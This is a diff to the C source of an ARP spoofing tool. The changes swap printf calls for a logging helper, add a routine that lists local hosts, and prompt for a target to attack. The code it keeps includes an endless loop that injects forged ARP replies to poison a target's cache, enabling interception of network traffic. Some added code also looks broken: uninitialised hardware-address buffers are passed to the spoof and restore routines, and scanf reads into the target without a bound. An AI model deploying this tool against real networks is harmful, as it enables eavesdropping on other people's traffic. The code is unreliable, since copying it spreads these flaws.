@@ -56,46 +56,25 @@ short arp_receiver_start( struct net *_net )
         );
         return -1;
     }
-    printf( "%s[+]%s Arp receiver spawned successfully!\n", GRN, NLL );
+    v_out( VINF, "Arp receiver spawned successfully!" );
     mssleep( 0.5 );
     return 0;
 }
 
-void list_targets( struct endpoint *_entps )
-{
-    for ( register uint32_t i = 0 ; i < live_hosts ; i++ ){
-        printf( "%s[-]%s %s\n", GRN, NLL, (_entps++)->host_ip );
-    }
-    printf( "\n" );
-}
-
-short endpoint_hw( char *ip, uint8_t *hw, struct endpoint *_entps )
-{
-    if ( live_hosts <= 0 ) {
-        return -1;
-    }
-    for ( register uint32_t i = 0 ; i < live_hosts ; i++ ) {
-        if ( strcmp( ip, _entps->host_ip ) == 0 ) {
-            cnvrt_hw2b( _entps->host_hw, hw );
-            return 0;
-        }
-        _entps++;
-    }
-    return -1;
-}
-
 void arp_clear_arp( struct spf_endpoints *_spf )
 {
+    uint8_t src_hw[6];
+    uint8_t dst_hw[6];
     uint8_t src_ip[4];
     uint8_t dst_ip[4];
 
     cnvrt_ip2b( _spf->gateway, src_ip );
     cnvrt_ip2b( _spf->target,  dst_ip );
 
-    printf( "Restoring arp table...\n" );
+    v_out( VINF, "Restoring arp table..." );
     for ( char i = 0 ; i < 5 ; i++ ) {
         arp_inject(
-            lt, ARPOP_REPLY, _spf->gateway_hw, src_ip, _spf->target_hw, dst_ip
+            lt, ARPOP_REPLY, src_hw, src_ip, dst_hw, dst_ip
         );
         sleep( 1 );
     }
@@ -105,6 +84,7 @@ void arp_clear_arp( struct spf_endpoints *_spf )
 void __spoof( struct spf_endpoints *_spf, struct net *_net )
 {
     uint8_t src_hw[6];
+    uint8_t dst_hw[6];
     uint8_t src_ip[4];
     uint8_t dst_ip[4];
 
@@ -114,49 +94,58 @@ void __spoof( struct spf_endpoints *_spf, struct net *_net )
 
     for ( ;; ) {
         arp_inject(
-            lt, ARPOP_REPLY, src_hw, src_ip, _spf->target_hw, dst_ip
+            lt, ARPOP_REPLY, src_hw, src_ip, dst_hw, dst_ip
         );
         sleep( 2 );
     }
 }
 
-void gather_endpoints( struct spf_endpoints *_spf, short target )
+void list_endpoints( char *iface )
 {
-    if ( !target ) {
-        printf( "[*] Choose a target: " );
-    }
+    struct endpoint *endps = _endps;
 
-    printf( "%s\n", _spf->target );
-    printf( "%s\n", _spf->gateway );
+    if ( lookup_arp( iface, NULL, NULL ) < 0 )
+        __die( arpspoof_errbuf );
+    
+    v_out( VINF, "Listing endpoints..." );
+    for ( uint32_t i = 0 ; i < live_hosts ; i++ ){
+        v_out( VINF, (endps++)->host_ip );
+    }
 }
 
 void arpspoof( struct net *_net, struct spf_endpoints *_spf )
 {
     short t;
-    struct endpoint _endps[_net->hosts_range];
-    
     t = strcmp( _spf->target, "0" );
     switch ( t ) {
         case 0:
-            printf( "%s[!]%s Target not specified!\n", RED, NLL );
-            printf( "%s[+]%s Refreshing arp table...\n", GRN, NLL );
+            v_out( VWARN, "Target not specified!" );
+            v_out( VINF, "Refreshing arp table..." );
             arp_refresh( _net );
+
+            list_endpoints( _net->iface );
+            v_out( VINF, "Choose target to spoof..." );
+            scanf( "%s", _spf->target );
             break;
         
         default:
-            if ( arp_receiver_start( _net ) < 0 ){
+            if ( arp_receiver_start( _net ) < 0 )
                 __die( arpspoof_errbuf );
-            }
-            printf( "%s[+]%s Probing target...\n", GRN, NLL );
+            
+            v_out( VINF, "Probing target..." );
             probe_endpoint( _spf->target, _net );
 
-            printf( "%s[+]%s Probing gateway...\n", GRN, NLL );
+            v_out( VINF, "Probing gateway..." );
             probe_endpoint( _spf->gateway, _net );
             break;
     }
+    
+    if ( lookup_arp( _net->iface, _spf->target, _spf->target_hw ) < 0 ) 
+            __die( arpspoof_errbuf );
 
-    if ( lookup_arp( _net->iface, _endps ) < 0 )
-        __die( arpspoof_errbuf );
-
-    gather_endpoints( _spf, t );
+    if ( lookup_arp( _net->iface, _spf->gateway, _spf->gateway_hw ) < 0 )
+            __die( arpspoof_errbuf );
+        
+    if ( strlen( _spf->target_hw ) <= 0 )
+        __die( "Target not found!" );
 }
